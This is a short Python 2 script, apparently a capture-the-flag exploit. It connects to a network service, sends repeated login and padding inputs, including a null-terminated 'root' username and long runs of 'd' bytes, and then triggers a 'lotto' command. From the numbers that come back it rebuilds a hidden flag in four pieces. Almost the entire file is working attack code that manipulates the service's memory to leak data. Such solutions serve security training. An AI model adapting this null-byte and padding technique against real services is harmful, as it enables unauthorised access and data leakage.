import socket
import sys
import struct

def read_to_prompt(s, prompt = ': ', debug = False):
    data = s.recv(1024)
    if debug: print data
    while data[len(data) -2:] != prompt:
        tmp = s.recv(1024)
        if debug: print tmp
        data += tmp
    return data

def send_cmd(s, cmd, prompt = ': ', debug = False):
    if debug: print cmd
    s.send(cmd)
    return read_to_prompt(s, prompt)

def get_key_piece(ip, port, begin, end):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))

    read_to_prompt(s)
    send_cmd(s, 'd\n', '$ ')
    send_cmd(s, 'login\n')
    send_cmd(s, 'd\n', '$ ')
    send_cmd(s, 'login\n')
    send_cmd(s, 'd\n', '$ ')
    send_cmd(s, 'login\n')
    send_cmd(s, 'd\n', '$ ')
    send_cmd(s, 'login\n')
    send_cmd(s, 'root\x00')
    send_cmd(s, 'd'*0x100, '$ ')
    send_cmd(s, 'exit\n', '$ ')
    send_cmd(s, 'exit\n', '$ ')
    send_cmd(s, 'login\n')
    send_cmd(s, 'd'*(0x10*begin) + '\n', '$ ')
    send_cmd(s, 'login\n')
    send_cmd(s, 'd'*(0x10*end) + '\n', '$ ')
    send_cmd(s, 'lotto\n')
    send_cmd(s, '\n')
    send_cmd(s, '\n')
    send_cmd(s, '\n')
    send_cmd(s, '\n')
    result = send_cmd(s, '\n', '$ ')

    s.close()

    ret = ''
    for i in result.split('\n')[2].split(', '):
        ret += struct.pack('<I', int(i))

    return ret

def main(ip, port):
    print 'Please wait for your flag...'
    a = get_key_piece(ip, port, 2, 4)
    b = get_key_piece(ip, port, 2, 3)
    c = get_key_piece(ip, port, 2, 2)
    d = get_key_piece(ip, port, 2, 1)

    print a + b + c + d

if __name__ == '__main__':
    main(sys.argv[1], int(sys.argv[2]))
